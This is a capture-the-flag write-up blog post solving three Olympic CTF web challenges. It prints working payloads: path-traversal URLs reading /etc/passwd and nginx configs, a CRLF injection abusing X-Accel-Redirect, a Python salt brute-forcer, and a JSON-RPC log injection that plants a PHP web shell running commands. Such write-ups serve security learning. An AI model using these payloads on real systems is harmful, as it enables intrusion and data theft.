

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Olympic CTF CURLing tasks</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../../../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../../../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../../../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/amp/">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Olympic CTF CURLing tasks">
    <meta property="og:description" content="I had the honour to participate with int3pids in the #Olympic CTF and these are the write ups of the Web tasks we solved. CURLing 200: Xnginx In this level we were presented with a simple web site where we could check some news First thing to notice is that">
    <meta property="og:url" content="http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/">
    <meta property="article:published_time" content="2014-02-09T16:54:00.000Z">
    <meta property="article:modified_time" content="2014-02-09T16:54:00.000Z">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="OlympicCTF">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Olympic CTF CURLing tasks">
    <meta name="twitter:description" content="I had the honour to participate with int3pids in the #Olympic CTF and these are the write ups of the Web tasks we solved. CURLing 200: Xnginx In this level we were presented with a simple web site where we could check some news First thing to notice is that">
    <meta name="twitter:url" content="http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="pwntester">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="CTF, Web, OlympicCTF">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "author": {
        "@type": "Person",
        "name": "pwntester",
        "image": {
            "@type": "ImageObject",
            "url": "//www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404",
            "width": 80,
            "height": 80
        },
        "url": "http://www.pwntester.com/author/pwntester/",
        "sameAs": []
    },
    "headline": "Olympic CTF CURLing tasks",
    "url": "http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/",
    "datePublished": "2014-02-09T16:54:00.000Z",
    "dateModified": "2014-02-09T16:54:00.000Z",
    "keywords": "CTF, Web, OlympicCTF",
    "description": "I had the honour to participate with int3pids in the #Olympic CTF and these are the write ups of the Web tasks we solved. CURLing 200: Xnginx In this level we were presented with a simple web site where we could check some news First thing to notice is that",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="post-template tag-ctf tag-web tag-olympicctf">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../../../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<article class="post tag-ctf tag-web tag-olympicctf">


        <span class="post-meta"><time datetime="2014-02-09">09 Feb 2014</time> on <a href="../../../../../tag/ctf/">CTF</a> | <a href="../../../../../tag/web/">Web</a> | <a href="../../../../../tag/olympicctf/">OlympicCTF</a></span>

        <h1 class="post-title">Olympic CTF CURLing tasks</h1>

        <section class="post-content">
            <p>I had the honour to participate with <strong>int3pids</strong> in the #Olympic CTF and these are the write ups of the Web tasks we solved.</p>

<h2 id="curling200xnginx">CURLing 200: Xnginx</h2>

<p>In this level we were presented with a simple web site where we could check some news</p>

<p><img src="../../../../../content/images/octopress/olympic-web200-1.png" alt=""></p>

<p>First thing to notice is that the news URL is vulnerable to path transversal:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=31-12-2013  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=../../../../../etc/passwd  
</code></pre>

<p>Since the name of the task was <strong>xnginx</strong> I looked for the nginx configuration file:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=../../../etc/nginx/nginx.conf  
</code></pre>

<p>That returned the configuration file:</p>

<p><img src="../../../../../content/images/octopress/olympic-web200-2.png" alt=""></p>

<p>Looking at the configuration file we can see where the site configuration is stored so we issued another request to fetch the site config:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=../../../etc/nginx/sites-enabled/default  
</code></pre>

<p>Config file:</p>

<pre><code class="language-lang-bash line-numbers data-line=35-38 "># You may add here your
# server {
#   ...
# }
# statements for each of your virtual hosts to this file

##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# http://wiki.nginx.org/Pitfalls
# http://wiki.nginx.org/QuickStart
# http://wiki.nginx.org/Configuration
#
# Generally, you will want to move this file somewhere, and start with a clean
# file but keep this around for reference. Or just disable in sites-enabled.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

server {  
    #listen   80; ## listen for ipv4; this line is default and implied
    #listen   [::]:80 default ipv6only=on; ## listen for ipv6

    root /usr/share/nginx/www;
    index index.html index.htm;

    # Make site accessible from http://localhost/
    server_name localhost;

        location / {
        limit_req zone=one burst=5 nodelay;
            proxy_pass http://127.0.0.1:5001;
        }

        location = /secret/flag {
            root /home;
            internal;
        }
}


# another virtual host using mix of IP-, name-, and port-based configuration
#
#server {
#   listen 8000;
#   listen somename:8080;
#   server_name somename alias another.alias;
#   root html;
#   index index.html index.htm;
#
#   location / {
#       try_files $uri $uri/ /index.html;
#   }
#}


# HTTPS server
#
#server {
#   listen 443;
#   server_name localhost;
#
#   root html;
#   index index.html index.htm;
#
#   ssl on;
#   ssl_certificate cert.pem;
#   ssl_certificate_key cert.key;
#
#   ssl_session_timeout 5m;
#
#   ssl_protocols SSLv3 TLSv1;
#   ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
#   ssl_prefer_server_ciphers on;
#
#   location / {
#       try_files $uri $uri/ /index.html;
#   }
#}
</code></pre>

<p>The interesting bits are highlighed:</p>

<pre><code class="language-lang-bash line-numbers ">location = /secret/flag {  
    root /home;
    internal;
}
</code></pre>

<p>Look like the flag is located at <a href="http://109.233.61.11:27280/secret/flag">http://109.233.61.11:27280/secret/flag</a> but only internal requests will get through. This looks like a SSRF task but in the end it was something completly different.</p>

<p>At the same time we found that the return link was vulnerable to Header Manipulation:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/?retpath=/news  
</code></pre>

<p>The above URL generates a redirect to <strong>news</strong></p>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 307 TEMPORARY REDIRECT  
Server: nginx/1.1.19  
Date: Sun, 09 Feb 2014 17:07:47 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 0  
Connection: keep-alive  
Location: /news  
</code></pre>

<p>And</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/?repath=/secret/flag%0d%0aHost:%20127.0.0.1  
</code></pre>

<p>generated:</p>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 307 TEMPORARY REDIRECT  
Server: nginx/1.1.19  
Date: Sun, 09 Feb 2014 17:10:22 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 0  
Connection: keep-alive  
Location: /secret/flag  
Host: 127.0.0.1  
</code></pre>

<p>However that was not enough to trick nginx.</p>

<p>After researchig about Nginx we found out that it has a similar feature as <a href="https://tn123.org/mod_xsendfile/">Apache mod_xsendfile</a> called <a href="http://wiki.nginx.org/X-accel">X-Accel module</a> that provides internal redirects. So basically nginx will intercept the responses and if it contains the X-Accel-redirect header, it will request the resource specified in the header and return the response back to the user. With that we were able to use the header manipulation vulnerability to craft the following request:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/?retpath=/%0D%0AX-Accel-Redirect%3A%20/secret/flag  
</code></pre>

<p>response was :</p>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Server: nginx/1.1.19  
Date: Sun, 09 Feb 2014 17:15:32 GMT  
Content-Type: text/html; charset=utf-8  
Last-Modified: Thu, 06 Feb 2014 13:55:07 GMT  
Connection: keep-alive  
Content-Length: 38

CTF{6e75d02b8e8329bb4b45c7dabd2e1da2}  
</code></pre>

<h2 id="curling300emdee">CURLing 300: emdee</h2>

<p>This level got us crazy for a long time, in the end it was an easy task to solve. We were presented with a revolutionary md5 hashing system :)</p>

<p><img src="../../../../../content/images/octopress/olympic-web300-1.png" alt=""></p>

<p>Submitting a new secret got us the hash and the timestamp used for the hashing:</p>

<p><img src="../../../../../content/images/octopress/olympic-web300-2.png" alt=""></p>

<p>After playing with other approaches, including sending long secrets so that the timestamp was cut off, we found out that we could hash non printable characters and some of them were really interesting, specially the "del" one or <strong>\x7F</strong></p>

<p>We can send del commands to delete previous introduced characters so hash(aa\xF7) == hash(a) for the same timestamp. We can used that to remove all the Salt characters except for the first one and then use the returned timestamp and hash to brute force the first character in the salt. And then repeat to extract the full salt.</p>

<p>To find out the length of the salt we can use the following script:</p>

<pre><code class="language-lang-python line-numbers ">for j in xrange(1,64):  
    secret = '\x7F' * j
    res = requests.post(URL, data={'secret':secret})
    ts, h = parse(res.content)
    if hashlib.md5(ts).hexdigest() == h:
        SALTLEN = j
        break
</code></pre>

<p>We basically send n delete characters and check if the returned hash is the result of hashing the returned timestamp. This gives us a lenght of 40 chracters. Now we can brute force the salt with the following script:</p>

<pre><code class="language-lang-python line-numbers ">import requests  
import re  
import hashlib

def parse(content):  
    m = re.search(r'your_secret \+ ([0-9.]+).*&lt;em&gt;([0-9a-f]+)', content)
    if not m:
        raise
    return m.group(1), m.group(2)

def bruteforce(prefix, h, ts):  
    for c in map(chr, range(32,126)):
        if hashlib.md5(prefix+c+ts).hexdigest() == h:
            return c
    return None
URL = 'http://109.233.61.11:34380/'  
SALTLEN = 0  
salt = ''

for j in xrange(1,64):  
    secret = '\x7F' * j
    res = requests.post(URL, data={'secret':secret})
    ts, h = parse(res.content)
    if hashlib.md5(ts).hexdigest() == h:
        SALTLEN = j
        break

for i in range(SALTLEN):  
    secret = '\x7F' * (39-i)
    if i == 39:
        secret = 'a'
    res = requests.post(URL, data={'secret':secret})
    ts, h = parse(res.content)
    if i == 39:
        ts = secret+ts
    c = bruteforce(salt, h, ts)
    salt += c
print salt  
</code></pre>

<p>Running the script returns us the salf: klgWCV7YgP0ugoiIXE9u0kSXpcnv3Z6eKmkIohJJ</p>

<p>Now we are said that the secret was a "short dictionary word" so we can run a dictionary attack to find the word that produces the hash so that md5(salt+word) = 40288d60073775070a7edcdcd1df9c56 which turns out to be "<strong>cow</strong>"</p>

<p>Flag was salt+word: klgWCV7YgP0ugoiIXE9u0kSXpcnv3Z6eKmkIohJJcow</p>

<h2 id="curling400rpc">CURLing 400: RPC</h2>

<p>In this level we were presented with a "broken" link" saying:</p>

<pre><code class="language-lang-bash line-numbers ">Notice: Undefined index: rpc_json_call in /var/www/index.php on line 27  
</code></pre>

<p>So we crafted a POST request with the following JSON RPC parameter:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call={ "jsonrpc": "2.0","method": "function", "params": ["123"] }  
</code></pre>

<p>And we got a "<strong>invalid method. Try test.</strong>" as result.</p>

<p>Nice, so we tried "test" as indicated and got a "<strong>42</strong>" as a result. We tried a bunch of methods with no luck until we tried with PHP magic method names and we got different responses for "<strong>construct" and "</strong>wakeup" all the remaining ones were returning the invalid method response.</p>

<p>"__wakeup" was not taking arguments and just returned a 200 OK</p>

<p>"__construct" was complaining about wrong arguments:</p>

<pre><code class="language-lang-bash line-numbers ">invalid method params! Valid is:  
    log_dir
    debug
    state
</code></pre>

<p>Ok, so we sent a request like</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call={ "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.log", "debug":true, "state":"test"} }  
</code></pre>

<p>We were expecting that we could write in <strong>/var/www/kk.log</strong> but nothing appeared there.</p>

<p>Fortunately we realized that we could send several commands so we tried:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call=[  
 { "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.log", "debug":true, "state":"test"} },
 { "jsonrpc": "2.0","method": "__wakeup", "params": {} }
]
</code></pre>

<p>And voila, we got a beautiful "<strong>...loged</strong>" response so we checked the "kk.log" file and it was there:</p>

<pre><code class="language-lang-bash line-numbers ">1391967947  O:3:"rpc":1:{s:5:"state";s:4:"test";}  
</code></pre>

<p>It seems like a serialized string but more interetingly, our test string was there, so next step is try to inject a web shell:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call=[  
 { "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.php", "debug":true, "state":"&lt;? echo file_get_contents('index.php');?&gt;"} },
 { "jsonrpc": "2.0","method": "__wakeup", "params": {} }
]
</code></pre>

<p>And there we go a beautiful shell. All we have to do is:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call=[  
 { "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.php", "debug":true, "state":"&lt;? passthru($_GET['cmd']);?&gt;"} },
 { "jsonrpc": "2.0","method": "__wakeup", "params": {} }
]
</code></pre>

<p>And then:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:8880/kk.php?cmd=cat%20/FLAG  
</code></pre>

<p>And flag:</p>

<pre><code class="language-lang-bash line-numbers ">1391968178 O:3:"rpc":1:{s:5:"state";s:28:"CTF{b15ffee30a117f418d1cede6faa57778} ";}  
</code></pre>
        </section>

        <footer class="post-footer">

            <section class="author">
                <div class="author-image">
                     <img src="http://www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404" alt="pwntester"> 
                </div>
                <div class="author-text">
                    <h4>pwntester</h4>
                    <p></p>
                    <div class="author-meta clearfix">
                        
                        
                    </div>
                </div>
            </section>

            <section class="share">
                <h4>Share this post</h4>
                <div class="share-icons">
                    <a class="fa fa-twitter-square" href="https://twitter.com/share?text=Olympic%20CTF%20CURLing%20tasks&amp;url=http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                        <span class="hidden">Twitter</span>
                    </a>
                    <a class="fa fa-facebook-square" href="https://www.facebook.com/sharer/sharer.php?u=http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                        <span class="hidden">Facebook</span>
                    </a>
                    <a class="fa fa-google-plus-square" href="https://plus.google.com/share?url=http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                        <span class="hidden">Google+</span>
                    </a>
                </div>
            </section>

        </footer>

        <section class="post-comments">
            <div id="disqus_thread"></div>
            <script type="text/javascript">
                /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
                var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
                /* * * DON'T EDIT BELOW THIS LINE * * */
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            </script>
            <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </section>


</article>
    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../../../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../../../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/prism.js?v=d47df0f104"></script>

</body>

